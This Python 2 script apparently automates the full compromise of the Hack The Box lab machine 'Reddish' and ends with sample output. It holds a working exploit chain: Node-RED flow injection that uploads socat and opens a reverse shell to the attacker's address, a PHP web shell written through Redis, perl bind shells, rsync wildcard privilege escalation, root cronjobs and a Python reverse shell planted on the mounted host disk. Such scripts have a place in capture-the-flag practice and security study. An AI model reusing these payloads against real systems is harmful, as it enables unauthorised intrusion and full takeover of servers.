#!/usr/bin/env python2
# Author: Alamot
import json
import time
import uuid
import fcntl
import base64
import urllib
import random
import requests
from pwn import *


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])


# context.log_level = 'debug'
LHOST = get_ip_address('tun0')
LPORT1 = "60000"
LPORT2 = str(random.randint(60003, 62535))
LPORT3 = str(random.randint(62535, 65535))
LPORT4 = "60001"
UUIDNAME = str(uuid.uuid4())[:8]
SOCAT_SRCPATH = "socat"
SOCAT_DSTPATH = "/var/tmp/socat" + UUIDNAME
SUBASH_PATH = "/var/tmp/" + UUIDNAME
CRONPL_PATH = "/tmp/" + UUIDNAME


def send_payloads():
    session = requests.Session()
    
    # Get id
    p1 = log.progress("Getting our id")
    headers = {"User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)","Connection":"close","Accept-Language":"en","Accept":"*/*"}
    try:
        response = session.post("http://10.10.10.94:1880/", headers=headers)
        if response.status_code != 200:
            p1.failure("Status "+str(response.status_code))
            sys.exit()
        else:
            uid = json_data = json.loads(response.text)["id"].strip()
            p1.success("OK (id = " + uid + ")")
    except requests.exceptions.RequestException as e:
        p1.failure(str(e))
        sys.exit()
        
    # Load flows
    p2 = log.progress("Loading node-red flows")
    with open(SOCAT_SRCPATH, 'r') as f:
        b64upload = base64.b64encode(f.read())
    rawBody = "{\"flows\":[{\"id\":\"e97f052f.2f3d48\",\"type\":\"tab\",\"label\":\"Flow 1\"},{\"id\":\"6c08c84b.d9c578\",\"type\":\"inject\",\"z\":\"e97f052f.2f3d48\",\"name\":\"\",\"topic\":\"\",\"payload\":\"node -e '(function(){ var  cp = require(\\\"child_process\\\"), sh = cp.spawn(\\\"/bin/sh\\\", [\\\"-c\\\", \\\"cat " + SOCAT_DSTPATH + ".b64 | base64 -d > " +SOCAT_DSTPATH + " && chmod +x " + SOCAT_DSTPATH + " && " + SOCAT_DSTPATH + " exec:/bin/bash,pty,rawer,echo=0,stderr,setsid,sigint tcp:" + LHOST + ":" + LPORT1 + "\\\"]); return /a/; })();'\",\"payloadType\":\"str\",\"repeat\":\"\",\"crontab\":\"\",\"once\":false,\"onceDelay\":0.1,\"x\":151,\"y\":88,\"wires\":[[\"d27da06a.44a1a\"]]},{\"id\":\"d27da06a.44a1a\",\"type\":\"exec\",\"z\":\"e97f052f.2f3d48\",\"command\":\"\",\"addpay\":true,\"append\":\"\",\"useSpawn\":\"false\",\"timer\":\"\",\"oldrc\":false,\"name\":\"\",\"x\":310,\"y\":80,\"wires\":[[],[],[]]},{\"id\":\"fae51292.d8e68\",\"type\":\"inject\",\"z\":\"e97f052f.2f3d48\",\"name\":\"\",\"topic\":\"\",\"payload\":\"" + b64upload +"\",\"payloadType\":\"str\",\"repeat\":\"\",\"crontab\":\"\",\"once\":false,\"onceDelay\":0.1,\"x\":113,\"y\":260,\"wires\":[[\"7e1e7cb5.664234\"]]},{\"id\":\"7e1e7cb5.664234\",\"type\":\"file\",\"z\":\"e97f052f.2f3d48\",\"name\":\"\",\"filename\":\"" + SOCAT_DSTPATH +".b64\",\"appendNewline\":false,\"createDir\":false,\"overwriteFile\":\"true\",\"x\":320,\"y\":260,\"wires\":[]}]}"
    headers = {"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0","Referer":"http://10.10.10.94:1880/red/"+uid+"/flows","Node-RED-API-Version":"v2","Connection":"close","Accept-Language":"en-US,en;q=0.5","DNT":"1","Content-Type":"application/json; charset=utf-8","Node-RED-Deployment-Type":"full"}
    try:
        response = session.post("http://10.10.10.94:1880/red/"+uid+"/flows", data=rawBody, headers=headers)
        if response.status_code != 200:
            p2.failure("Status "+str(response.status_code))
            sys.exit()
        else:
            p2.success("OK")
    except requests.exceptions.RequestException as e:
        p2.failure(str(e))
        sys.exit()

    # Inject base64-encoded socat
    p3 = log.progress("Injecting base64-encoded socat")
    headers = {"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0","Referer":"http://10.10.10.94:1880/red/"+uid+"/inject/fae51292.d8e68","Node-RED-API-Version":"v2","Connection":"close","Accept-Language":"en-US,en;q=0.5","DNT":"1"}
    try:
        response = session.post("http://10.10.10.94:1880/red/"+uid+"/inject/fae51292.d8e68", headers=headers)
        if response.status_code != 200:
            p3.failure("Status "+str(response.status_code))
            sys.exit()
        else:
            p3.success("OK")
    except requests.exceptions.RequestException as e:
        p3.failure(str(e))
        sys.exit()

    # Inject nodejs reverse shell
    p4 = log.progress("Injecting socat reverse shell via nodejs [" + LHOST + ":" + str(LPORT1) + "]")
    headers = {"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0","Referer":"http://10.10.10.94:1880/red/" + uid + "/inject/6c08c84b.d9c578","Node-RED-API-Version":"v2","Connection":"close","Accept-Language":"en-US,en;q=0.5","DNT":"1"}
    try:
        response = session.post("http://10.10.10.94:1880/red/" + uid + "/inject/6c08c84b.d9c578", headers=headers)
        if response.status_code != 200:
            p4.failure("Status "+str(response.status_code))
            sys.exit()
        else:
            p4.success("OK")
    except requests.exceptions.RequestException as e:
        p4.failure(str(e))
        sys.exit()


print("What shell do you want?")
print("[1] root@nodered")
print("[2] www-data@www")
print("[3] root@www")
print("[4] root@backup")
print("[5] root@reddish")
print("[6] Exit")
response = None
while response not in ["1", "2", "3", "4", "5", "6"]:
    response = raw_input("Please enter a number 1-6: ").strip()
if response == "6":
    sys.exit()

try:
    threading.Thread(target=send_payloads).start()
except Exception as e:
    log.error(str(e))
socat = listen(LPORT1, bindaddr=LHOST, timeout=20).wait_for_connection()

if response == "1":
    socat.interactive()
    sys.exit()

with log.progress("Uploading " + UUIDNAME + ".php on the www container via redis") as p:
    socat.sendline("/bin/echo -ne '*1\\r\\n$8\\r\\nFLUSHALL\\r\\n*3\\r\\n$3\\r\\nSET\\r\\n$1\\r\\n1\\r\\n$45\\r\\n<?php echo shell_exec($_GET[\"e\"].\" 2>&1\"); ?>\\r\\n*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$12\\r\\n" + UUIDNAME +  ".php\\r\\n*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$3\\r\\ndir\\r\\n$46\\r\\n/var/www/html/8924d0549008565c554f8128cd11fda4\\r\\n*1\\r\\n$4\\r\\nSAVE\\r\\n' | " + SOCAT_DSTPATH + " - TCP:redis:6379")
    socat.sendline("/bin/echo -ne 'GET /8924d0549008565c554f8128cd11fda4/" + UUIDNAME+ ".php?e=$(whoami)@$(hostname)END HTTP/1.1\\r\\nHost: nodered\\r\\nUser-agent: curl\\r\\n\\r\\n' | " + SOCAT_DSTPATH + " - TCP:www:80")
    output = socat.recvuntil("www-data@www")
    if "www-data@www" in output:
        p.success("OK (user = www-data@www)")
    else:
        p.failure("FAIL")
        sys.exit()

with log.progress("Sending perl bind shell [www-data@www:" + str(LPORT2) + "] via " + UUIDNAME + ".php & trying to connect") as p:
    perl_payload = "perl -e 'use Socket;$p=" + str(LPORT2) +";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};'"
    urled_perl_payload = urllib.quote_plus(perl_payload)
    socat.sendline("/bin/echo -ne 'GET /8924d0549008565c554f8128cd11fda4/" + UUIDNAME + ".php?e=" + urled_perl_payload + " HTTP/1.1\\r\\nHost: nodered\\r\\nUser-Agent: curl\\r\\n\\r\\n' | " + SOCAT_DSTPATH + " - TCP:www:80")
    socat.sendline(SOCAT_DSTPATH + " file:`tty`,echo=0,rawer TCP:www:" + str(LPORT2))
    output = socat.recvuntil("shell", timeout=20)
    if "shell" in output:
        p.success("OK")
    else:
        p.failure("FAIL")
        sys.exit()
    socat.sendline("script --return -c '/bin/bash -i' /dev/null")
    socat.clean(1)
    socat.sendline("stty raw -echo")
    
if response == "2":
    socat.interactive()
    sys.exit()

with log.progress("Exploiting wildcards for privesc. Wait at most 180 secs for rsync backup job to run") as p:
    socat.sendline('echo "/bin/cp /bin/bash ' + SUBASH_PATH + ';/bin/chmod 4755 ' + SUBASH_PATH + '" > "/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/' + UUIDNAME + '.rdb"')
    socat.sendline('touch "/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e sh ' + UUIDNAME + '.rdb"')
    count = 0
    while True:
        p.status(str(count))
        sleep(1)
        socat.sendline("[ -f " + SUBASH_PATH + " ] && echo 'OK' || echo 'NO'")
        socat.recvuntil('$ ')
        output = socat.recv(3).strip()
        if "OK" in output:
            p.success("OK")
            break
        count += 1
        if count > 180:
            p.failure("FAIL")
            sys.exit()
    socat.sendline(SUBASH_PATH + ' -i -p')
    socat.sendline("cd /root")
    socat.clean(1)

if response == "3":
    socat.interactive()
    sys.exit()

with log.progress("Sending a cronjob for bind shell [root@backup:" +str(LPORT3)+ "]. Please wait") as p:
    socat.sendline("echo 'use Socket;$p=" + str(LPORT3) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};' > " + CRONPL_PATH + ".pl")
    socat.sendline("echo '* * * * * root /usr/bin/perl " + CRONPL_PATH +  ".pl' > " + CRONPL_PATH + "cronjob")
    socat.sendline("rsync -a " + CRONPL_PATH + ".pl backup::src" + CRONPL_PATH + ".pl")
    socat.sendline("rsync -a " + CRONPL_PATH + "cronjob backup::src/etc/cron.d/")
    for i in range(62):
        p.status(str(61 - i))
        time.sleep(1)
    socat.sendline("perl -MFcntl=F_SETFL,F_GETFL,O_NONBLOCK -MSocket '-e$0=perl;socket($c,AF_INET,SOCK_STREAM,0)&&connect($c,pack_sockaddr_in("+ str(LPORT3) + ",inet_aton(\"backup\")))||die$!;fcntl$_,F_SETFL,O_NONBLOCK|fcntl$_,F_GETFL,0 for@d=(*STDIN,$c),@e=($c,*STDOUT);L:for(0,1){sysread($d[$_],$f,8**5)||exit and$f[$_].=$f if vec$g,$_*($h=fileno$c),1;substr$f[$_],0,syswrite($e[$_],$f[$_],8**5),\"\";vec($g,$_*$h,1)=($i=length$f[$_]<8**5);vec($j,$_||$h,1)=!!$i}select$g,$j,$k,5;goto L'")
    output = socat.recvuntil("shell", timeout=20)
    if "shell" in output:
        p.success("OK")
    else:
        p.failure("FAIL")
        sys.exit()
    socat.sendline("script --return -c '/bin/bash -i' /dev/null")
    socat.clean(1)
    socat.sendline("stty raw -echo")
    
if response == "4":
    socat.interactive()
    sys.exit()

with log.progress("Sending reverse shell cronjob [" + LHOST + ":" +str(LPORT4)+ "] for root@host. Please wait") as p:
    socat.sendline("mkdir /mnt/sda1")
    socat.sendline("mount /dev/sda1 /mnt/sda1")
    socat.sendline("cat /mnt/sda1/root/root.txt")
    socat.sendline("echo 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + LHOST + "\"," + str(LPORT4) + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn([\"/bin/bash\",\"-i\"]);s.close();exit();' > /mnt/sda1/tmp/" + UUIDNAME + ".py") 
    socat.sendline("echo '* * * * * root /usr/bin/python /tmp/" + UUIDNAME + ".py' > /mnt/sda1/etc/cron.d/" + UUIDNAME + "cronjob")
    host_shell = listen(LPORT4, bindaddr=LHOST, timeout=65).wait_for_connection()
    if host_shell.sock is None:
        p.failure("FAIL")
        sys.exit()
    else:
        p.success("OK")
    host_shell.interactive()
    sys.exit()


'''
$ ./autopwn_reddish.py 
What shell do you want?
[1] root@nodered
[2] www-data@www
[3] root@www
[4] root@backup
[5] root@reddish
[6] Exit
Please enter a number 1-6: 5
[+] Getting our id: OK (id = 25af4604ab3402f2bdea796ac32bbcc3)
[+] Trying to bind to 10.10.12.229 on port 60000: Done
[+] Waiting for connections on 10.10.12.229:60000: Got connection from 10.10.10.94 on port 46784
[+] Loading node-red flows: OK
[+] Injecting base64-encoded socat: OK
[+] Injecting socat reverse shell via nodejs [10.10.12.229:60000]: OK
[+] Uploading 1994851d.php on the www container via redis: OK (user = www-data@www)
[+] Sending perl bind shell [www-data@www:61031] via 1994851d.php & trying to connect: OK
[+] Exploiting wildcards for privesc. Wait at most 180 secs for rsync backup job to run: OK
[+] Sending a cronjob for bind shell [root@backup:65104]. Please wait: OK
[+] Sending reverse shell cronjob 10.10.12.229:60001] for root@host. Please wait: OK
[+] Trying to bind to 10.10.12.229 on port 60001: Done
[+] Waiting for connections on 10.10.12.229:60001: Got connection from 10.10.10.94 on port 50432
[*] Switching to interactive mode
root@reddish:~# $  
'''
